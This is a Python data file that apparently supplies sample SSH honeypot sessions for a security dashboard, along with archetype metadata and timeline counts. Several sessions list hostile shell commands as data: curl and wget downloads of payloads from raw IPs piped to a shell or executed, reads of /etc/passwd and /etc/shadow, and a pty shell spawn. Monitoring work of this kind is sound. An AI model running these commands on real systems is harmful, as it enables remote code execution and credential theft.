from typing import List, Dict, Any

FALLBACK_SESSIONS: List[Dict[str, Any]] = [
    {
        "id": "e6f0a2bd",
        "ip": "185.220.101.42",
        "country": "Germany",
        "flag": "DE",
        "city": "Frankfurt",
        "startedAt": "2026-07-26T11:38:11Z",
        "duration": "14m 22s",
        "commands": ["uname -a", "id", "curl 45.131.65.14/p.sh | sh", "chmod +x p.sh", "./p.sh"],
        "severity": "Critical",
        "score": 0.94,
        "archetype": "Post-exploitation",
        "status": "Closed",
        "protocol": "SSH",
        "username": "root"
    },
    {
        "id": "3a81fc7e",
        "ip": "45.148.10.12",
        "country": "Netherlands",
        "flag": "NL",
        "city": "Amsterdam",
        "startedAt": "2026-07-26T11:31:49Z",
        "duration": "3m 08s",
        "commands": ["cat /etc/passwd", "wget http://91.92.240.8/x", "chmod +x x", "./x"],
        "severity": "High",
        "score": 0.81,
        "archetype": "Credential harvester",
        "status": "Closed",
        "protocol": "SSH",
        "username": "admin"
    },
    {
        "id": "bf920d4a",
        "ip": "103.27.186.7",
        "country": "India",
        "flag": "IN",
        "city": "Mumbai",
        "startedAt": "2026-07-26T11:29:02Z",
        "duration": "00m 44s",
        "commands": ["ls", "exit"],
        "severity": "Low",
        "score": 0.19,
        "archetype": "Reconnaissance bot",
        "status": "Closed",
        "protocol": "SSH",
        "username": "test"
    },
    {
        "id": "71d9e461",
        "ip": "89.248.165.34",
        "country": "Netherlands",
        "flag": "NL",
        "city": "Amsterdam",
        "startedAt": "2026-07-26T11:25:38Z",
        "duration": "7m 51s",
        "commands": ["busybox wget http://89.248.165.34/b", "chmod +x b", "./b"],
        "severity": "High",
        "score": 0.78,
        "archetype": "Malware deployer",
        "status": "Closed",
        "protocol": "SSH",
        "username": "ubuntu"
    },
    {
        "id": "ca04b197",
        "ip": "154.12.67.91",
        "country": "United States",
        "flag": "US",
        "city": "Ashburn",
        "startedAt": "2026-07-26T11:19:16Z",
        "duration": "2m 11s",
        "commands": ["whoami", "pwd", "ls -la", "history"],
        "severity": "Medium",
        "score": 0.48,
        "archetype": "Manual probing",
        "status": "Closed",
        "protocol": "SSH",
        "username": "guest"
    },
    {
        "id": "99b311ef",
        "ip": "113.161.44.88",
        "country": "Vietnam",
        "flag": "VN",
        "city": "Hanoi",
        "startedAt": "2026-07-26T10:45:10Z",
        "duration": "1m 15s",
        "commands": ["nmap -sV localhost", "cat /proc/cpuinfo"],
        "severity": "Medium",
        "score": 0.52,
        "archetype": "Reconnaissance bot",
        "status": "Closed",
        "protocol": "SSH",
        "username": "root"
    },
    {
        "id": "52c8810a",
        "ip": "194.26.29.112",
        "country": "Germany",
        "flag": "DE",
        "city": "Berlin",
        "startedAt": "2026-07-26T10:12:00Z",
        "duration": "18m 05s",
        "commands": ["sudo su", "cat /etc/shadow", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
        "severity": "Critical",
        "score": 0.96,
        "archetype": "Post-exploitation",
        "status": "Closed",
        "protocol": "SSH",
        "username": "oracle"
    },
    {
        "id": "18d407bc",
        "ip": "177.54.148.20",
        "country": "Brazil",
        "flag": "BR",
        "city": "Sao Paulo",
        "startedAt": "2026-07-26T09:30:15Z",
        "duration": "0m 32s",
        "commands": ["echo test"],
        "severity": "Low",
        "score": 0.12,
        "archetype": "Reconnaissance bot",
        "status": "Closed",
        "protocol": "SSH",
        "username": "user"
    }
]

ARCHETYPE_META: Dict[str, Dict[str, str]] = {
    "Reconnaissance bot": {"color": "#47a8ff", "desc": "Automated probes with short command sequences."},
    "Credential harvester": {"color": "#8d7cff", "desc": "Repeated authentication attempts across common accounts."},
    "Manual probing": {"color": "#efb456", "desc": "Interactive reconnaissance and environment checks."},
    "Post-exploitation": {"color": "#ef7f88", "desc": "Download, persistence, or lateral-movement behavior."},
    "Malware deployer": {"color": "#61dcb0", "desc": "Execution of payload scripts and binary fetching."}
}

COUNTRY_CODE_MAP: Dict[str, str] = {
    "India": "IN",
    "United States": "US",
    "Germany": "DE",
    "Netherlands": "NL",
    "Brazil": "BR",
    "Vietnam": "VN",
}

TIMELINE_DEFAULT: List[Dict[str, Any]] = [
    {"time": "00:00", "sessions": 21, "anomalies": 1},
    {"time": "02:00", "sessions": 34, "anomalies": 2},
    {"time": "04:00", "sessions": 25, "anomalies": 0},
    {"time": "06:00", "sessions": 53, "anomalies": 4},
    {"time": "08:00", "sessions": 43, "anomalies": 3},
    {"time": "10:00", "sessions": 76, "anomalies": 5},
    {"time": "12:00", "sessions": 61, "anomalies": 2},
    {"time": "14:00", "sessions": 89, "anomalies": 8},
    {"time": "16:00", "sessions": 56, "anomalies": 3},
    {"time": "18:00", "sessions": 72, "anomalies": 6},
    {"time": "20:00", "sessions": 48, "anomalies": 2},
    {"time": "22:00", "sessions": 38, "anomalies": 1}
]
